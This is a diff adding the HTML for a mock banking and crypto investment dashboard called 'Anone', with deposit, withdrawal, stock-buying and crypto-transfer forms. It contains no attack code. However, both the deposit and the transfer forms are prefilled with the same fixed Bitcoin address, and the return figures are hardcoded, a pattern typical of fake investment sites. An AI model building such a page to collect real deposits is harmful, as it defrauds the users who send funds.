@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Anone | Banking & Investment Platform</title>
+    <meta http-equiv="refresh" content="0; url=/home" />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="app-shell">
+      <header class="topbar">
+        <div>
+          <p class="eyebrow">Anone</p>
+          <h1>Banking and investing in one place</h1>
+        </div>
+        <div class="topbar-actions">
+          <button class="icon-button" id="theme-toggle" type="button">🌙 Dark</button>
+          <button class="icon-button menu-button" id="menu-button" type="button">☰</button>
+          <span class="status-pill">+12.8% YTD</span>
+          <a href="login.html" class="ghost-link">Logout</a>
+        </div>
+      </header>
+
+      <nav id="mobile-nav" class="mobile-nav">
+        <a href="#portfolio">Portfolio</a>
+        <a href="#markets">Markets</a>
+        <a href="#search">Search</a>
+      </nav>
+
+      <main class="dashboard">
+        <section class="card hero-card">
+          <div>
+            <p class="eyebrow">Portfolio Overview</p>
+            <h2 id="welcome-name">Welcome back</h2>
+            <p class="hero-copy">
+              Move money, grow savings, and invest in stocks from one unified dashboard designed for everyday banking and long-term wealth.
+            </p>
+          </div>
+          <div class="hero-metric">
+            <p>Net Worth</p>
+            <h3 id="portfolio-value">$0.00</h3>
+            <span class="positive">$0.00 this month</span>
+          </div>
+        </section>
+
+        <section class="card profile-card">
+          <div class="card-header">
+            <h2>Profile</h2>
+            <span class="status-pill">Verified</span>
+          </div>
+          <div class="profile-content">
+            <div class="profile-avatar">A</div>
+            <div>
+              <p id="profile-name" class="profile-name">User</p>
+              <p id="profile-email" class="profile-email">Email</p>
+              <p class="profile-status">Premium banking and investment access</p>
+            </div>
+          </div>
+        </section>
+
+        <section class="card merged-card">
+          <div class="card-header">
+            <h2>Crypto Funding</h2>
+            <span class="status-pill">Instant</span>
+          </div>
+          <form id="crypto-deposit-form" class="inline-form">
+            <h3>Deposit Crypto</h3>
+            <select id="crypto-asset" class="select-input">
+              <option value="BTC">Bitcoin (BTC)</option>
+              <option value="ETH">Ethereum (ETH)</option>
+              <option value="USDT">Tether (USDT)</option>
+              <option value="USDC">USD Coin (USDC)</option>
+            </select>
+            <input type="number" id="crypto-amount" placeholder="Amount" step="0.01" required />
+            <div class="wallet-row">
+              <input type="text" id="crypto-wallet" value="bc1q92k4lf66q4fm7wkr9kc9y4k9yea2xd2y9htpkf" placeholder="Wallet address" required />
+              <button type="button" id="copy-wallet-btn">Copy</button>
+            </div>
+            <button type="submit">Convert to Cash</button>
+          </form>
+          <p id="crypto-status" class="action-status">Send crypto and it will be converted to your account balance instantly for banking and investing.</p>
+          <div class="history-card">
+            <h3>Recent Crypto Activity</h3>
+            <ul id="crypto-transaction-history" class="history-list"></ul>
+          </div>
+        </section>
+
+        <section class="card merged-card">
+          <div class="card-header">
+            <h2>One Account for Banking & Investing</h2>
+            <span class="status-pill">Unified</span>
+          </div>
+          <div class="crypto-balance-card">
+            <div>
+              <p>Crypto Balance</p>
+              <strong id="crypto-balance">0.00 BTC</strong>
+            </div>
+            <span class="status-pill positive">Confirmed</span>
+          </div>
+          <div class="merged-grid">
+            <div class="merged-box">
+              <p>Bank Balance</p>
+              <strong id="bank-balance">$0.00</strong>
+              <span>Deposit, withdraw, and transfer instantly</span>
+            </div>
+            <div class="merged-box">
+              <p>Investment Value</p>
+              <strong id="investment-summary">$0.00</strong>
+              <span>Buy stocks and grow your portfolio</span>
+            </div>
+          </div>
+        </section>
+
+        <section class="card chart-card" id="markets">
+          <div class="card-header">
+            <h2>Performance Trend</h2>
+            <span class="status-pill">+8.4% vs last quarter</span>
+          </div>
+          <svg id="performance-chart" class="chart" viewBox="0 0 320 160"></svg>
+        </section>
+
+        <section class="card" id="portfolio">
+          <div class="card-header">
+            <h2>Active Portfolio</h2>
+            <span class="status-pill">Live</span>
+          </div>
+          <div class="metrics-grid">
+            <div>
+              <p>Cash Balance</p>
+              <strong id="cash-balance">$0.00</strong>
+            </div>
+            <div>
+              <p>Annual Return</p>
+              <strong>24.7%</strong>
+            </div>
+            <div>
+              <p>Risk Level</p>
+              <strong>Balanced</strong>
+            </div>
+          </div>
+        </section>
+
+        <section class="card actions-card">
+          <div class="card-header">
+            <h2>Account Actions</h2>
+          </div>
+
+          <form id="deposit-form" class="inline-form">
+            <h3>Add Cash</h3>
+            <input type="number" id="deposit-amount" placeholder="Amount" step="0.01" required />
+            <button type="submit">Add Money</button>
+          </form>
+
+          <form id="withdraw-form" class="inline-form">
+            <h3>Withdraw</h3>
+            <input type="number" id="withdraw-amount" placeholder="Amount" step="0.01" required />
+            <button type="submit">Withdraw</button>
+          </form>
+
+          <form id="buy-form" class="inline-form">
+            <h3>Buy Stock</h3>
+            <input type="text" id="buy-symbol" placeholder="Ticker" required />
+            <input type="number" id="buy-amount" placeholder="Amount" step="0.01" required />
+            <button type="submit">Buy Shares</button>
+          </form>
+
+          <form id="transfer-form" class="inline-form">
+            <h3>Transfer Crypto</h3>
+            <select id="transfer-asset">
+              <option value="BTC">Bitcoin (BTC)</option>
+              <option value="ETH">Ethereum (ETH)</option>
+              <option value="USDT">Tether (USDT)</option>
+              <option value="USDC">USD Coin (USDC)</option>
+            </select>
+            <input type="number" id="transfer-amount" placeholder="Amount" step="0.01" required />
+            <input type="text" id="transfer-address" value="bc1q92k4lf66q4fm7wkr9kc9y4k9yea2xd2y9htpkf" placeholder="Recipient address" required />
+            <button type="submit">Send Transfer</button>
+          </form>
+
+          <p id="action-status" class="action-status">Use the tools below to fund your account or purchase stocks.</p>
+        </section>
+
+        <section class="card holdings-card">
+          <div class="card-header">
+            <h2>Top Holdings</h2>
+            <a href="#" class="ghost-link">View all</a>
+          </div>
+          <ul id="holdings-list" class="holdings-list"></ul>
+        </section>
+
+        <section class="card watchlist-card">
+          <div class="card-header">
+            <h2>Watchlist</h2>
+          </div>
+          <ul class="watchlist-list">
+            <li><span>TSLA</span><strong>+4.2%</strong></li>
+            <li><span>NVDA</span><strong>+3.8%</strong></li>
+            <li><span>PLTR</span><strong>+2.6%</strong></li>
+          </ul>
+        </section>
+
+        <section class="card search-card" id="search">
+          <div class="card-header">
+            <h2>Search Stocks</h2>
+          </div>
+          <div class="search-bar">
+            <input id="stock-search" type="text" placeholder="Try AAPL, MSFT, GOOGL" />
+            <button id="search-button" type="button">Search</button>
+          </div>
+          <ul id="search-results" class="search-results"></ul>
+          <p id="search-status" class="search-status">Search a ticker to add it to your watchlist.</p>
+        </section>
+      </main>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
+</html>
